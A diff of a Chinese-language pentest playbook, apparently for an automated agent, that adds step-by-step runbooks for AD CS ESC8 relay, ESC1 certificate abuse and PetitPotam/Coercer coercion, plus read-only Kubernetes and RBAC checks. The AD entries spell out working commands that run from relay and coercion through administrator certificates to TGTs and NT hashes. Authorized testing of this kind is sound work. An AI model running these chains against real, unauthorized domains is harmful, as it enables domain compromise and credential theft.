@@ -22,7 +22,11 @@
 ### 03 NTLM relay 打 ADCS ESC8（源：relaying-ntlm-for-adcs-esc8）
 - 触发词：ESC8、relay、certsrv、NTLM relay、EPA、SMB signing
 - 前置：发现 CA HTTP 端点；授权允许监听与强制认证；已确认目标网络可达
-- 步骤：1) 先只读确认 SMB/LDAP signing 与 EPA 状态（`nxc smb --gen-relay-list`）；2) `certipy relay -ca <CA> -template <Tpl>` 或 `ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs`；3) 触发授权内强制认证，收到证书后立刻 `certipy auth -pfx ...` 验证
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt` → rc=0｜期望输出：`SMB signing: False` 的目标入表；表为空 = 无可 relay 面，停。
+  2) `certipy relay -ca '<CA>' -target 'http://<CA_HOST>' -template 'DomainController'` → rc=0（长驻）｜期望输出：`Got certificate!` 并落 `*.pfx`；`EPA`/`signing` 报错=面已关。
+  3) `certipy auth -pfx <pfx> -dc-ip <DC_IP>` → rc=0｜期望输出：`Got TGT` + `Saving credential to .ccache`；rc=1（`KDC_ERR_*`）=证书用途/链不匹配，转 ESC1/ESC4。
+  4) `nxc smb <DC_IP> -k -no-pass` → rc=0｜期望输出：`[+] <domain>\<user>`（含 `Pwn3d!`）才写 confirmed。
 - 判据：relay 日志收到认证、CA 颁发了目标模板证书、`certipy auth` 出 TGT/ccache；三步缺一不可
 - 失败判据：signing/EPA 已开、CA 拒绝模板、只 relay 到 LDAP、证书 auth 失败 → 停 relay，转 ESC1/ESC4 或凭据直连
 - reference：Tool/skill/ad-cloud/references/ad-attacks.md
@@ -30,7 +34,11 @@
 ### 04 ADCS ESC1 模板验证（源：exploiting-active-directory-certificate-services-esc1）
 - 触发词：ESC1、SAN、certipy req、certipy auth、证书模板
 - 前置：`certipy find -vulnerable` 有输出；当前账号对目标模板有 Enroll；授权允许申请测试证书
-- 步骤：1) 记录模板的 Enroll/SAN/EKU/manager approval/CA flag；2) `certipy req -ca <CA> -template <Tpl> -upn <test-upn>`；3) 立即 `certipy auth -pfx <pfx>`，只保留 TGT 指纹与有效期
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout` → rc=0｜期望输出：目标模板段 `ESC1 : True`、`Enroll` 含当前账号、`Manager Approval : False`。
+  2) `certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"` → rc=0｜期望输出：`Saved certificate and private key to 'administrator.pfx'`；rc=1（`CERTSRV_E_*`/`denied by policy`）=ESC1 不成立，停。
+  3) `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs --input find.json` → rc=0｜期望输出：`"verdict": "candidate"`（只拿到 pfx 就是 candidate，不是 confirmed）；rc=2 = 输入 schema 不对。
+  4) `certipy auth -pfx administrator.pfx -dc-ip "$DC"` → rc=0｜期望输出：`Got TGT` + `NT hash`；rc=1（`KDC_ERR_CLIENT_REVOKED`/`KDC_ERR_PADATA_TYPE_NOSUPP`）=证书不可认证。
 - 判据：pfx 的 EKU 含 Client Auth/Smart Card Logon，`certipy auth` 返回 TGT/ccache，且能访问一个只读目标
 - 失败判据：无 Enroll、需审批、CA 拒绝 SAN、auth 失败 → ESC1 不成立，转 ESC4/ESC5/ESC7，不反复 req
 - reference：Tool/skill/ad-cloud/references/kerberos-and-adcs.md
@@ -38,7 +46,11 @@
 ### 05 强制认证（PetitPotam/Coercer）前提核查（源：coercing-authentication-with-coercer-petitpotam）
 - 触发词：PetitPotam、Coercer、强制认证、MS-EFSRPC、relay
 - 前置：明确授权强制认证目标；有可用 relay/监听端；确认不会影响生产
-- 步骤：1) 先只读枚举目标可达的强制认证接口（EFSRPC/DFSCoerce/PrinterBug）；2) 在隔离测试目标上验证监听端能收到认证；3) 再决定是否与 ESC8/relay 组合，记录目标、时间、来源
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<LISTENER_IP>` → rc=0｜期望输出：`Coerce+ ... EFSRPC/DFSCoerce` 命中；`STATUS_ACCESS_DENIED`=接口已补，停。
+  2) `sudo responder -I eth0 -A`（或专用监听端）→ rc=0｜期望输出：`[SMB] NTLMv2-SSP Client : <target_ip>`，记时间与来源。
+  3) `impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'` → rc=0｜期望输出：`GOT CERTIFICATE!` + `Writing PKCS#12 certificate`。
+  4) 组合 ESC8/ESC11/ESC17 前先跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input find.json` → rc=0｜期望输出：`"esc_flags"` 含目标 ESC 且 `"verdict"` 非 blocked；rc=2 = 缺配置位，不许猜。
 - 判据：监听端收到目标机器账号认证（含来源 IP/时间），且未造成业务中断；认证可被 relay 到授权端点
 - 失败判据：目标已打补丁/接口关闭、监听收不到、强制认证触发业务告警 → 立即停，转凭据直连/其他面
 - reference：Tool/skill/ad-cloud/references/ad-attacks.md
@@ -150,7 +162,10 @@
 ### 19 Kubernetes 渗透测试的只读起步（源：performing-kubernetes-penetration-testing）
 - 触发词：Kubernetes、kubeconfig、API server、渗透测试、namespace
 - 前置：有 kubeconfig/SA token；授权允许只读 API；不创建资源
-- 步骤：1) `python Tool/scripts/adcloud-check.py --kubeconfig <file> --json` 做离线分诊；2) `kubectl config current-context` + `auth can-i --list`；3) 只读枚举 pods/secrets/rbac，记录 context 与 token 指纹
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `python Tool/scripts/adcloud-check.py --kubeconfig input/kubeconfig.yaml --json > artifacts/run.json` → rc=0｜期望输出：`"ok": true` + findings（如 `K8S-TRANSPORT-002`、`K8S-RBAC-00x`）。
+  2) `kubectl config current-context` → rc=0｜期望输出：单个 context 名；rc=1 = kubeconfig 不可用，停。
+  3) `kubectl auth can-i --list` → rc=0｜期望输出：`Resources`/`Verbs` 表（≥ 1 行）；`Forbidden` 或空表 = 身份无效，转 Secret/CI。
 - 判据：context/token 有效、auth can-i 有明确结果、只读枚举成功；记录 API server 与 namespace
 - 失败判据：token 过期、TLS/连接失败、auth can-i 全 no → 路径 blocked，转 Secret/CI 或换身份
 - reference：Tool/skill/ad-cloud/references/k8s-and-container.md
@@ -158,7 +173,10 @@
 ### 20 K8s RBAC 提权审计（源：auditing-kubernetes-rbac-privilege-escalation）
 - 触发词：RBAC、ClusterRole、RoleBinding、wildcard、escalate、bind
 - 前置：有只读 RBAC 权限；授权允许读 role/clusterrole/binding
-- 步骤：1) 导出 Role/ClusterRole 与绑定；2) 找 wildcard、escalate/bind、impersonate、secrets、create pods；3) 用 `ad-repro.py --kind k8s-rbac` 复算，再决定是否做只读验证
+- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
+  1) `kubectl get clusterrolebinding,rolebinding -A -o json > rbac.json` → rc=0｜期望输出：`items` ≥ 1 且 subject 含当前 SA/用户；空 `items` = 无可审面。
+  2) 把绑定与当前身份整理成 `{"kind":"k8s-rbac","can_i":[...]}` 后跑 `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input rbac-eval.json` → rc=0｜期望输出：`"verdict"` ∈ {candidate, confirmed} 且 `checks[].ok` 与 `auth can-i` 一致；rc=2 → 打印 `{"ok": false, "blocked_at": ...}`，先修输入。
+  3) `kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>` → rc=0｜期望输出：`yes` 才算路径成立；`no` = blocked，转 Secret/CI。
 - 判据：绑定 subject 与当前身份匹配、规则确实允许目标 verb/resource、只读验证成功
 - 失败判据：名称像高权但绑定窄、规则被 admission 限制、auth can-i 为 no → candidate/blocked，转 Secret/CI
 - reference：Tool/skill/ad-cloud/references/k8s-and-container.md
